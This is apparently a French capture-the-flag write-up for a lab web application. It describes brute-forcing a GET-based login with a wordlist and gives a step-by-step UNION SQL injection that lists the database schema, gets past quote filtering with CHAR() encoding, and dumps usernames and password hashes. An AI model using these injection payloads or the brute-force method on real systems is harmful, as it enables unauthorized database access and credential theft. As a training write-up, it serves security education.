# BruteForcer Member & SQL Injection

1. Solution 1 : La page http://192.168.1.16/index.php?page=signin permet de se log

On a un formulaire de signin 

On remarque que le formulaire utilise la méthode GET, donc les params submit passe par la query string
Donc on peut brute force le password, notamment avec la liste "common.txt" pour trouver que le password : shadow
CF. authForcer.py, bon faudrait un multi thread mais en laissant run longtemps ça suffit ^^'


2. Solution 2 : Injection SQL pour obtenir les passwords des users


SQL : schema > database > table

http://192.168.1.16/index.php?page=member

Quelques notions en SQL ici.

La table **SCHEMATA** fournit des informations sur les bases de données du serveur.

Exemple : 

    SELECT SCHEMA_NAME AS 'Database' FROM INFORMATION_SCHEMA.SCHEMATA [WHERE SCHEMA_NAME LIKE 'wild']

    SHOW DATABASES [LIKE 'wild']

L'affichage de la page http://192.168.1.16/index.php?page=member contient 2 champ, donc on procédera à la requête suivante (avec le null) pour avoir les schema :

--------> 1 OR 1=1 UNION SELECT null, schema_name from information_schema.schemata

On voit qu'il y a une DB 'Member_Brute_Force' (les autres : images : on a déjà eu le flag, sql_injection et survey on checkera + tard)

Pour avoir toutes les tables :

--------> 1 OR 1=1 UNION SELECT table_name, null from information_schema.tables

Mais on ne veut que les table de la DB Member_Brute_Force, essayons ceci (qui ne fonctionnera pas à cause des quotes) :

--------> 1 OR 1=1 union select null, table_name from information_schema.tables WHERE table_schema='Member_Brute_Force'

Le problème c'est que les guillements ne passent pas. Pour ça il y a un trick, c'est utiliser la fonction CHAR() de SQL

On a besoin de convertir Member_Brute_Force en tableau de char (ASCII)

Pour ça : https://onlinestringtools.com/convert-string-to-ascii

On obtient : 77 101 109 98 101 114 95 66 114 117 116 101 95 70 111 114 99 101

--------> 1 OR 1=1 union select null, table_name from information_schema.tables WHERE table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101)

Ça fonctionne ! :)

On obtient le nom de la table dans la Member_Brute_Force : db_default, on veut maintenant les colonnes :


--------> 1 OR 1=1 union select null, column_name from information_schema.columns WHERE table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101)

username et password sont donc les noms des 2 colonnes dans de la table db_default

--------> 1 OR 1=1 union select username, password from Member_Brute_Force.db_default

    First name: root
    Surname : 3bf1114a986ba87ed28fc1b5884fc2f8 --> shadow

    First name: admin
    Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
